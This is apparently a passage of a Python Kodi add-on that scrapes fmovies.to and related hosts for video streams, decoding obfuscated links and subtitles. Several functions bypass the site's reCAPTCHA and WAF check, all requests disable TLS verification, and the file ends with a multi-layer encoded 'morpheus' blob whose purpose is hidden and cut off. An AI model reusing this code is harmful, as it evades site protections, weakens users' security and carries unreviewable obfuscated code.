    if jsonab:
        url = jsonab.get('url',None)

    link2 = DecodeLink(url)

    reg = '?sub.info='
    reg = reg if reg in link2 else '?subtitle_json='

    link,subt = link2.split(reg)
    
    
    subsout=[]
    subtx = unquote(subt)
    subt = False
    if subtx:
        response = sess.get(subtx, headers=headers, verify=False).json()

        for subtitle in response:
            subt = subtitle.get('src',None)
            subt2 = subtitle.get('file',None)
            subt = subt if subt else subt2
            label = subtitle.get('label',None)
            subsout.append({'label':label,'subt':subt})
    if wybornapisow and subsout:
        labels = [x.get('label') for x in subsout]
        sel = xbmcgui.Dialog().select('Subtitle language',labels)   
        if sel>-1:
            subt=subsout[sel].get('subt')
            if subsout[sel].get('label') == 'Polish':
            
                subt = napisy if transPolish(subt) else subt
                
        else:
            subt = False

    if 'mcloud' in link2 or 'vizcloud' in link2:

        pattern = r'(?://|\.)((?:my?|viz)cloud\.(?:to|digital|cloud))/(?:embed|e)/([0-9a-zA-Z]+)'
        hostm_id = re.findall(pattern,link,re.DOTALL)
        #

        if hostm_id:
            media_id = hostm_id[0][1]
            host = hostm_id[0][0]
            med_id = vidcloud_deco(media_id).replace('=','').replace('/','_')

            link = re.sub('/(?:embed|e)/','/info/',link2).replace(media_id,med_id.replace('=','').replace('/','_'))
        stream_url = ''
        try:
            response = sess.get(link, headers=headers, verify=False).json()
            outz=[]
    
            if 'success' in response:
                if response.get('success',None):
                    srcs = response.get('media',None).get('sources',None)
                    for src in srcs:
                        fil = src.get('file',None)
                        if 'm3u8' in fil:
                            stream_url = fil+'|User-Agent='+UA+'&Referer='+link2
                            break
            elif 'status' in response:
                if response.get('status',None) == 200:
                    srcs = response.get('data',None).get('media',None).get('sources',None)
                    for src in srcs:
                        fil = src.get('file',None)
                        if 'm3u8' in fil:
                            stream_url = fil+'|User-Agent='+UA+'&Referer='+link2
                            break
        except:
            pass
    
    
    

    else:
        
        stream_url = resolveurl.resolve(link)
    if stream_url:
        play_item = xbmcgui.ListItem(path=stream_url)
    
        if subt:
            play_item.setSubtitles([subt])
        xbmcplugin.setResolvedUrl(addon_handle, True, listitem=play_item)

def DecodeLink(mainurl):

    ab=mainurl[0:6]   #23.09.21
    ac2 = mainurl[6:]   #23.09.21

    
    
    
    ab = 'DZmuZuXqa9O0z3b7'
    ac= decode2(mainurl)

    link = dekoduj(ab,ac)
    link = unquote(link)
    return link

#def getFileJson():
#   with xbmcvfs.File(jfilename) as f:
#       jsondata = json.loads(f.read())
#   html =   jsondata.get('html',None)
#   return html


    
    
def getFileJson():

    from contextlib import closing
    from xbmcvfs import File
    
    with closing(File(jfilename)) as f:
        jsondata = f.read()
        
    jsondata = json.loads(jsondata)

    html =   jsondata.get('html',None)
    return html


def getLinksSerial(hrefx):
    try:
        sez,ep = hrefx.split('-')
    except:
        sez,ep,sh = hrefx.split('-')
    a=''
    
    htmlx =  getFileJson()
    href = re.findall('href="([^"]+)',htmlx)[0]
    href = 'https://fmovies.to'+href if href.startswith('/') else href
    
    
    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    
    result = parseDOM(html, 'section', attrs={'class': "info"})[0]  
    plot = parseDOM(result, 'div', attrs={'itemprop': "description"})
    
    mname = parseDOM(result, 'h1', attrs={'itemprop': "name","class":"title"}) # = <h1 itemprop="name" class="title">
    mname = mname[0] if mname else ''
    plot = mname+'[CR]'+plot[0] if plot else ''
    imag = parseDOM(result, 'img', ret='src')#[0]
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''
    
    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
    
    countries = re.findall('Country\:(.+?)<\/div>',result) # 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''
    
    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''
    
    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''
    
    yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
    yr = yr[0].strip().split('-')[0] if yr else ''
    infol = {'plot':PLchar(plot),'genre': genre,'country':country,'duration':tim,'year':yr}
    
    servid = 1
    try:
        href1,serwery = re.findall("""href="([^"]+)"\\n\s*data-kname="%s".*?data\-ep=\\'({.*?)}"""%(hrefx),htmlx,re.DOTALL)[0]
    except:
        servid = 0

    href = 'https://fmovies.to'+href1 if href1.startswith('/') else href1

    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',htmlx,re.DOTALL)
    
    
    
    
    
    
    
    
    nazwax = '- '+nazwa if mname else nazwa
    
    for linkid1,host in linki:
        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
    
        linkid = re.findall(linkid1+'"\:"([^"]+)',serwery)#[0]
        if linkid:
            add_item(name=PLchar(tyt), url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    
    
    
    
    
       
#   for serv,linkid,href in servid :
#   
#       href = 'https://fmovies.to'+href if href.startswith('/') else href
#   
#       nazwax = '- '+nazwa if mname else nazwa
#       host = re.findall('data-id="%s".*?>(.+?)<'%str(serv),servers,re.DOTALL)[0]
#       tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
#       add_item(name=tyt, url=linkid+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    #if len(servid)>0:
    if servid:
        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle) 
    else:
        xbmcgui.Dialog().notification('[B]Błąd[/B]', 'Brak materiałów do wyświetlenia',xbmcgui.NOTIFICATION_INFO, 8000,False)

def ListEpisodes(exlink):

    links= getEpisodes(exlink)  
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getLinksSerial', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getEpisodes(href):
    seas,serv = href.split('|')

    html =   getFileJson() 

   # episodes = re.findall('data-season="%s"(.*?)<\/ul>'%str(seas),html,re.DOTALL)[0]

    
    episodes = parseDOM(html,'div', attrs={'class': "episodes",'data\-season': str(seas)})[0] 
    
    
    
    out=[]

    #<div class="episode">
    epizody = parseDOM(episodes, 'div', attrs={'class': "episode"})#[0] 
    for epi in epizody:
    
   # for kname,title in re.findall('data-kname="([^"]+).*?>(.+?)<\/',episodes,re.DOTALL):
        kname = re.findall('data\-kname="([^"]+)',epi,re.DOTALL)[0]

        try:
            sez,epis = kname.split('-')
        except:
            sez,epis,sh = kname.split('-')
        seas = 'S%02d'%int(sez)
        try:
            episod = 'E%02d'%int(epis)
        except:
            episod = 'E-%s'%str(epis)
        title = re.findall('class="name">([^<]+)',epi,re.DOTALL)#[0]
        if title:
            title = re.sub("<[^>]*>","",title[0].strip())
        else:
            title = nazwa.split('-')[-1]
        title = title+' ('+seas+episod+')'
        out.append({'title':PLchar(title) ,'href':kname,'img':rys})

    return out
def ListSeasons(exlink):

    links= getSerial(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getEpisodes', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getSerial(href):

    out=[]
    href,id = href.split('|')

    headers.update({'Referer': href})

    recap =      addon.getSetting('cap_token')
    if not recap:
    
    
        recap="03AGdBq25eDJkrezDo2y"
 
    verid = getVerid(id)    
    params = (
        ('id', id),
        ('vrf', verid),

    )

    response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, verify=False)#
    
    html = (response.content)

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')
 
    if 'sitekey=' in html:

        sitek=re.findall('data\-sitekey="(.+?)"',html)[0]

        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')

        data = {
                'g-recaptcha-response': token}
        
        response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)#
        
        params = (
            ('id', id),
            ('token', token),
        )
        response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)#
    
        
    jsondata = response.json()

    with io.open(jfilename, 'w', encoding='utf8') as f:
        str_ = json.dumps(jsondata,
            indent=4, sort_keys=True,
            separators=(',', ': '), ensure_ascii=False)
        f.write(to_unicode(str_))

    html = jsondata.get('html',None)
    

  #  sezony = parseDOM(html, 'ul', attrs={'class': "seasons"})[0]
  #  sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)
    sezony = parseDOM(html, 'div', attrs={'id': "seasons"})[0]
    
    

    sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)

    for sez in sezonyx:

       # sesid,servers,title = re.findall('data-id="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
     #   sesid,servers,title = re.findall('data-number="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
        

        sesid = re.findall('value="([^"]+)',sez,re.DOTALL)[0]
        title= re.findall('>([^<]+)<span',sez,re.DOTALL)[0]
        servers = ''
        out.append({'title':title.strip()+nazwa,'href':sesid+'|'+servers,'img':rys})
    return out
    

try:
    import string
    STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    #CUSTOM_ALPHABET =   "5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"   #23/05/22
    CUSTOM_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='

    ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)
except:
    STANDARD_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    #CUSTOM_ALPHABET =   b"5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"  #23/05/22
    CUSTOM_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='
    
    
    ENCODE_TRANS = bytes.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = bytes.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)

    
    
    
def encode2(input):
    return base64.b64encode(input).translate(ENCODE_TRANS)
def decode2(input):
    try:    
        xx= input.translate(DECODE_TRANS)
    except:
        xx= str(input).translate(DECODE_TRANS)
    return base64.b64decode(xx)

def vidcloud_deco(media_id):
    try:
        import string
     #   STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
     #   CUSTOM_ALPHABETx =   '0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG='  #23/05/22
        CUSTOM_ALPHABETx =   "51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
    
        ENCODE_TRANSx = string.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = string.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    except:
       # STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
      #  CUSTOM_ALPHABETx =   b'0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG=' #23/05/22
        CUSTOM_ALPHABETx =   b"51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
        
        
        ENCODE_TRANSx = bytes.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = bytes.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    
        
        
        
    def encode2x(input):
        return base64.b64encode(input).translate(ENCODE_TRANSx)
    def decode2x(input):
        try:    
            xx= input.translate(DECODE_TRANSx)
        except:
            xx= str(input).translate(DECODE_TRANSx)
        return base64.b64decode(xx)
    
    
    

    try:
        media_id = encode2x(media_id)
    except:
        media_id = encode2x(media_id.encode('utf-8')).decode('utf-8')
   # seed = 'LCbu3iYC7ln24K7P'  #23/05/22
    seed = 'dOuhV3IsSvf7jeI5' #28/05/22
    
    
    
    
    
    
    #
    array_list = list(range(0, 256))
    
    j = 0;
    
    pix_color = "";
    
    length = 256;
    
    i = 0;
    for i in range(length):
    
        j = (j + array_list[i] + ord(seed[i%len(seed)]))%length
    
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
    j = i = 0;
    
    index = 0;
    for index in range(len(media_id)):
    
        i = (i + index) % length
        j = (j + array_list[i]) % length;
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
        if sys.version_info >= (3,0,0):
            try:
                pix_color += chr((media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
            except:
                pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
        
        else:
            pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )

    if sys.version_info >= (3,0,0):
        pix_color=pix_color.encode('Latin_1')

    pix_color = encode2x(pix_color)

    if sys.version_info >= (3,0,0):
        pix_color = pix_color.decode('utf-8')

    return pix_color;
    
    
#function av(n, t) {
#    var r = _0x450c;
#    for (var i, u = [], e = 0, o = r7, c = 0; c < 256; c++) u[c] = c;
#    for (c = 0; c < 256; c++) e = (e + u[c] + n[K4 + e4 + s4](c % n[ii])) % (256), i = u[c], u[c] = u[e], u[e] = i;
#    for (var c = 0, e = 0, f = 0; p.rdOti(f, t[ii]); f++) e = (e + u[c = p[r(1086) + "Dg"](c, 1) % (256)]) % (256), i = u[c], u[c] = u[e], u[e] = i, o += A3[e5 + qt + e4](t[K4 + e4 + s4](f) ^ u[p.AXpPG(u[c] + u[e], 256)]);
#    return o;
#}
    
def dekodujNowe(t,n): #16.08.21
    #n = encode2(n)
    r=[]
    i=[]
    u=0
    x=''
    c = 256
    for o in range(c):
        i.append(o)
    o=0

    for o in range(c):
        #u = (u + i[o] + t.charCodeAt(o % t.length)) % c
        u = (u + i[o] + ord(t[o%len(t)]))%c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    e = 0
    u = 0
    o =0
    for e in range(len(n)):
    #e+=1
        o = (o + e) % c
        u = (u + i[o]) % c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    #x += String.fromCharCode(n.charCodeAt(e) ^ i[(i[o] + i[u]) % c])
        if sys.version_info >= (3,0,0):
            try:
                x += chr((n[e])^ i[(i[o] + i[u]) % c] )
            except:
                x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
        else:
            x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
    return x


def dekoduj(r,o):

    t = []
    e = []
    n = 0
    a = ""
    for f in range(256): 
        e.append(f)

    for f in range(256):

        n = (n + e[f] + ord(r[f % len(r)])) % 256
        t = e[f]
        e[f] = e[n]
        e[n] = t

    f = 0
    n = 0
    for h in range(len(o)):
        f = f + 1
        n = (n + e[f % 256]) % 256
        if not f in e:
            f = 0
            t = e[f]
            e[f] = e[n]
            e[n] = t

            a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])
        else:
            t = e[f]
            e[f] = e[n]
            e[n] = t
            if sys.version_info >= (3,0,0):
                #a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])
                
                try:
                    a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr((n[e])^ i[(i[o] + i[u]) % c] )
                except:
                    a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
                
                
                
                
                
                
                
            else:
                a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])

    return a

def PLchar(char):
    if type(char) is not str:
        char=char.encode('utf-8')
    char = char.replace('\\u0105','\xc4\x85').replace('\\u0104','\xc4\x84')
    char = char.replace('\\u0107','\xc4\x87').replace('\\u0106','\xc4\x86')
    char = char.replace('\\u0119','\xc4\x99').replace('\\u0118','\xc4\x98')
    char = char.replace('\\u0142','\xc5\x82').replace('\\u0141','\xc5\x81')
    char = char.replace('\\u0144','\xc5\x84').replace('\\u0144','\xc5\x83')
    char = char.replace('\\u00f3','\xc3\xb3').replace('\\u00d3','\xc3\x93')
    char = char.replace('\\u015b','\xc5\x9b').replace('\\u015a','\xc5\x9a')
    char = char.replace('\\u017a','\xc5\xba').replace('\\u0179','\xc5\xb9')
    char = char.replace('\\u017c','\xc5\xbc').replace('\\u017b','\xc5\xbb')
    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace("&gt;",">") 
    char = char.replace("&Iacute;","Í").replace("&iacute;","í")
    char = char.replace("&icirc;","î").replace("&Icirc;","Î")
    char = char.replace('&oacute;','ó').replace('&Oacute;','Ó')
    char = char.replace('&quot;','"').replace('&amp;quot;','"')
    char = char.replace('&bdquo;','"').replace('&rdquo;','"')
    char = char.replace("&Scaron;","Š").replace("&scaron;","š")
    char = char.replace("&ndash;","-").replace("&mdash;","-")
    char = char.replace("&Auml;","Ä").replace("&auml;","ä")

    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace('&#8222;','"').replace('&#8221;','"')   
    char = char.replace('[&hellip;]',"...")
    char = char.replace('&#038;',"&")   
    char = char.replace('&#039;',"'")
    char = char.replace('&quot;','"')
    char = char.replace('&nbsp;',".").replace('&amp;','&')
    
    
    
    char = char.replace('Napisy PL',"[COLOR lightblue](napisy pl)[/COLOR]")
    char = char.replace('Lektor PL',"[COLOR lightblue](lektor pl)[/COLOR]")
    char = char.replace('Dubbing PL',"[COLOR lightblue](dubbing pl)[/COLOR]")   
    return char 

import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDc2NDY3NTUwNzEzODcxNTc0YTc2NzEyYjcwNjYzMDY2NzQ3NDUxNTA3MTMwNzA2NDRmNzU0YTY5NWEzMDM5NGM3MDMxNmY0YjU0MzIzNjQyNDM1NDc1MzUzMjQyNjg1NTRjMzAzNjZkMzAzMjZjNmE0ZDRmNTI0ZjZiNzM3NTc2MzcyZjQ1NGU1MDQ2NjY1NjcyNzEzNDJiNGY2NzJiNzQ3MDUyNTE1NDQxNzg0NTZhNzg2ZTMzNDUyYjQ3NGMzOTc0MzcyYjY0MzYyYjRjNzgzNjJmN2E3MjYyMzIyZjZhNTgyZjJmNzkzMzJmMzc2ZDRhNGYzNTY2MmYyZjRjNTg3NjMxNzk3MjM1NzY0ODM1Mzk2MjY1MzMzMDM5MmY1MDRjMzQ3NDJmMmI1Mjc2NjU0YjUwMzcyYjMxMzczOTU1NmEzODJmNmQzNDM5N2EzOTJmNTcyZjJmMmI3MjYzMmYzNTRjNjkyYjc2MzE1ODYyMzczOTc3Mzk2YzRlNGMzMTZjMzE2MjM0NzU0NTZiMzczMzMwNjUzOTc0NzI0ODQzNzA2ZTZiMzc3MjcyMmI0YzRmNzI3ODZiNmM1NDUwNmM1MzYxNTk0NjUwMzk2Mzc2NjIyYjM3Mzk1Mzc0NjY2MjZkNzg0ODY0NGQzMTUwMzk2ZTYyMzU3MjMzNzU2ODM1NWE3NDc3NjIyYjc1NjI3MjdhNjY1NDM3NmIzMzc2NTE2OTMxNDc3MzM1NGQyZjQzMzI0MzYyNTI3ODMzNTk3MTdhNjEzMjU2MzY1NzcxNzk2YTU3Nzc3MTQ0NDQ1NzQ2NmIzNzRiNzkzNTY2NWE2ZDU0Mzk3NDcwNzYzOTY4NGY1MzZjNGQzMzc0NjQ3NzZkNjM3NDcwNWEzMDU4NTY2MjY4NjQ2Zjc1Nzk1OTdhNzQ1YTRhNzMzNzRiMmYyZjU5NGE3MjYxMzU1NDUxNzAzOTYxMmIzMDRlMmI3MDMyNzY2NTUyNGI0ZjYxNjk2ZjMwNmM1OTUxMzA0MjZmMzE0NDM5Mzk3NTYyMzA2ZDZkMzg1OTU3NzY1OTMyNmE2MjVhNmQzOTc0NjI1MzU4NTA1MzRmNDk2ZTUzNjE0ZTM1NzgzNjM5NzAzMDc2N2E2Njc3NjY1ODYxNmEzNTM2Mzc1NTc0N2E2NTY5NzIzNjRjNzg0YzQ1NTYzMDM0NGE3NjM4NTQ3NjY0NjE2YzZmNTE1OTY4MmI1YTU2NTI0MTY2NmQ1NTM3NzE3MTRhNGU0ODZjNTgzMjZiNzU2ZjZlNjU3NjYyMzkzMjUxNzY3MTRlNzY3MjRlNGE1NTQ1MmYzOTZlNzE2ODc2NTc1NjU5MzczNTRjNTM3MDcwNGM3MjcyMzY1NjdhNTY0YTY2NTc2Njc0NmMyZjdhNDc1NDU3NmU2MjQ3Mzk2MTY3NDI2ODcxNTA2ZTc0NGYyZjZiMzI3ODUzNjk1NjM5NzQ0NTMwNDg2YTMwNjY3OTMzNmE0ODM0NmUzMzZjNmMzNDRjMzY0ZTMxNTM2ZjRlMmI0ZDMxNTI0NjQ4NGY2MzMxNDM2ODcwNzAzMzJmNGUzMzU1MzE1MTUyNDgzNDY4NzUzODRjNTU3NzRkMmY0NDcwNmM3NDQ2NTY0YzU3NjgzODc1NmQ2MjM4MmIzNDM3MzQ3MDQzNWE0MjJmMzgzNDZkNTA0ZTJmNjU2NjUwNzA3NTYyNzk3MTRjMzE2ZjUwNzg2MjcwNjk2ZTZkNDc2NzJiNmE2NDU5MzczNzUyNGIzMTcwNTA2ZTQ3NDQ1MDU0NTI3NTc1NjI3ODUxMzM3MTJmNTc0Nzc4NzAzNzU0NzQ0YzZhNTY3NjQ5NGQ2MzZiNzc0NDM2MzI3MDMwNDY2YTRmNTM1MTY5MzY1MzU5MzYyZjUwNzY0MjM4NjU3NzczNTgzMjM0NTQ2YjYzNGU3NjU0NjMzMzcwNzY2OTZkNjgzOTY1MmY0MjY4MzI0NjYyNDUzMDM1NzY3MTc3NjI2MzRkNjY0YjU4NmU3NDRiNGM0NjMxNzMzMjMwNTA0YjQ4MzM0NTM3NzEyZjVhNjM1MTZlNTg3MzRlNDE0ZDZhNTYzNDU4NGE2NDZiNjM2OTc1NTc0ZTRhMmY0MjM0MzAyYjUzMzY0MzQ0MzU1NjcwNjk2Mjc2NmIzODc1NzA0NzY2MzA2YTcyNzM2ZTJiNzE0NjJmNzQ2YjQ4N2E0YzQzNDI2ZTZiNmU2MzRhNzY1NjRkNGE3MjU3NmQzNjM2NDE3MjM2NDI1NjMwNjc2ZDY0NGM1NjZmNGUzOTcwNTA0ZjRhNTI1NTc2NTI2MjUzN2E0YjY2NjE0MTM2NjkzMTMyNjUzOTRhNDYzNzUxMzczODUzMmY0YTRjNmY1MjQ4NTM1YTMwNjcyYjUxNGUyZjUzNDMyYjUzNGY2YTYxNTE0ODc3Njk2ZTZkNTc0YzZkNWE2NjM1NDQ2Njc4NTc3NDM0NmEzMTVhNzA2NDQ1NTYyYjQ5NTgyYjQ1NGEzNjUzMzczODZlNjE2OTQ5Mzk3NzM3Nzc2YTM1NGQyZjcyNGE3YTcwNzA3NjU0MzM0YTY4NjU2YTYyNmEyYjQxNTA3NjU1NzQ3OTQ0NTk2YjJmNWE0MzM4NTYzNjMxNDg1MDMzMzE3NTRiMzM2ODU2NGQ0NDJiNzg2ODZjNmE2NjQ3NzgzOTc5NDM2MTQzNGQyYjU2NzM1Mjc2NjY2OTJiNmIzOTJmNjI0NTRlMzY0NjQyNDYzNDZiMmY0YTRmNjMzOTcyNWE1ODc1NGM0YTRjNjY1NDU1NDk1MDQ5NDM2NjUzNDYzNzM3NTM1MDY2Njg0Zjc0NDM2MTZiMzE3ODYyNzg0NjY2NGI0MTZlNTM1MzczNjQzMjUyMmY3MDQzNjQ2YjMwMzk2YzQ1MmY0ODQ2NzQ2YTY2NTM0MzJiNDczNDYyMmI1MTMzNmE0YjM5NmEzOTc5NGM1Mzc3NDg2ZjQ2MmY1YTQ2NjU3NzZlNTI3NjU3NjQ3OTQ4MzUzNzZkNDcyZjRhNzU1MTRjMzM1MzUxMzY1MzRkMzk2ODZjMzY1MjZlNDM2MzU5NzY3OTQ3NTk3NjM3NDQ2NjZkMzk1YTQxNGY1Njc0NGE2NzUwMzU0NTc5MzM3ODYyMzA2ZTUwNzc0NTJiNDEzNTVhNDU0YTMwNzU1MDU1Mzk0MzJiNzQzMDZkNjY2ODUxNjEzMjMyNTc1MzU4Mzc2NTU3NTQ2NTczNmM1MDYyNmM0YTRjNjU2NjMzNzk2MjM4NmIzODQ2NDY0NTUwMmY1MTU4NjM2YjZjNDk3NjM1Njg1NzMwNzQ0ZjRiMmY0OTU1NTY2YjU2MzA1NzQ3NDYyZjQ4NmM2NTUzMmY2ZTUwNTU1YTY1NmY3NDM3NjY0OTY2MzM2OTc3NTgzNzc0NTk2ZTM0NjEzODQ2NzU2ZjQ5NjU3NzU1MmY0YTU0NWE0YzYzMzczNTZhNzQyYjRhMzczMjc4NDM3MzY5MzE0YTJmMzc2ZjRkMmYzOTVhNjYzMDY4MzM1OTYzNjU2YjdhN2E2Njc5NGY3ODYyNzg3YTM0NGE2NDc3NDEyYjUxNTg1NTRjNzY0NTZiNDgzNjczMzk2NjVhNmE3OTU0Nzc1MDc4NmMzOTc4MzM0YzUyNWEzNzc0NmIyZjc0NTAzMTUxNzU3Mzc0Njk0YjY1NmI0YzMxNjk1MDUyNjU1MDY2NDM3NDY5MzM0NDZlNzU0NjU4NjM0NDc2NGI0YzQ5NjY1MjU0NzA0NjJiNmI1NDMzNGE0NjRmNzk0NTM1NzAyZjVhNTA2YzRkNWE0YTM5NDU0ODM5NDY0YTJmNmI3YTQyNDQzMDdhNDU0NDM5NGE2YTUwNGQzOTU5MzM2YzY3NTg2NjQxNTgzNDU0NmU2ZjMzNmI1NDc4NDk3YTc1NTQ2NjZiNjc3NjYyN2EzNjc3NmU0MjY1MzY2ODc2MmI1MjJmNTM1ODVhNGQyZjMyNTg2ZDc0MzI0ODU0MmI2ZDZiNzQ0NjY2NmI0YzMwNDU1NjJiNGM3MDc1Nzk0MTY2Nzc2YzUwNjUzMzY4NmEzODZiNTA0YzJiNDc3NjMxNWE1MzU4NzQ0NTM3MzQ1NjY2NGM1ODZmNDI1MDM2NmY2NTY4Mzk2YjY3MmYzNzRkNjY0YjYyNmM2NzU0NTA1Mjc2Njc0ODJiNmYzNzM4NjQ1MTYxMmI2YjRhNzg0YzZlNTgzOTZlMzMzODJmNzk0YTY2Mzk0NTc0NGQ0ZjJiNzc1ODJmNDU0MTJmNjc0NDM2Mzg0Yzc5Nzc3MjY3MzUzNTQxNTg2NjQ0NmE3NDRjNTc0NTM3NjczMzM1NGQ1MDZkNTk2MTM0NmY3NTQxMmY2OTRiMmI2YjMwMmY1MTM5Nzk1MjU1MzY1MDc4MzAyYjQ2NTA3ODYzNDU3MDcyNzM0Mjc5NDY1ODJiNDI3NTRmNGM3ODY1NGUyZjU2NTk1NjM2Njg2ZTU3NTczNDQ4NmU3ODQyNGY3OTYyNTE1NjM2NTk1YTUwNmI0ODJiNjgzOTJiNDY0NDM2NDM3OTQ1NjY2MzM0MzQ2NjM4N2E3MDVhNTg3ODQ2NDQzNDU5Mzg1MzM0NzI2NDQ2MmY3MzZiNDY1NDJiNmU2NTRiNzM0ODJmNDU2MzM5N2E3ODRkNmU0NTY4NmEzODY5NTAzODUyNzg0NDQ4Nzk0MjU4NmQ3MjM4MmY0YjYyNmQ2MzY1NDIyZjYxNDIzMDVhNmU3MDRkNjY3OTZlNDc0NjZlNjQ0NzYxNmY1OTRkNGIzNzc4NDY3NDU3MzQzNTUwNGE0NDRkNGMzODY3NDI2NjY5NTYzODU1NWEzODZkNzY2NzdhMmI3YTUwMzY0Nzc4NTc0YTM5NzY0NjM2NzgzMzY3NmEyZjRmNGI0YTM2NTM0ODY4NDQzOTZkNjM1YTc4Mzk1NTVhNzk2ODQ4MmI0NTJmMzcyYj